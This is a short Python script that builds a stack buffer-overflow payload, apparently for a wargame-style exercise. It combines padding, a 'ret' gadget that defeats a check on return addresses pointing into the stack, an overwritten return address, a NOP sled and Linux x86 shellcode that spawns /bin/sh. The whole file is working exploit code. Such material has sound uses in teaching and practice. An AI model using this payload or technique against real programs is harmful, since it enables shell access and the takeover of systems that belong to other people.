#!/usr/bin/env python
import struct

# to bypass check whether eip return to stack once, use ret to return twice

padding = "AAAA" * (0x55-0x41)
nopslides = "\x90"*100
eip = struct.pack("<I", 0xbffff7b0+30)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
ret = struct.pack("<I", 0x080484f9)
print padding+ret+eip+nopslides+shellcode
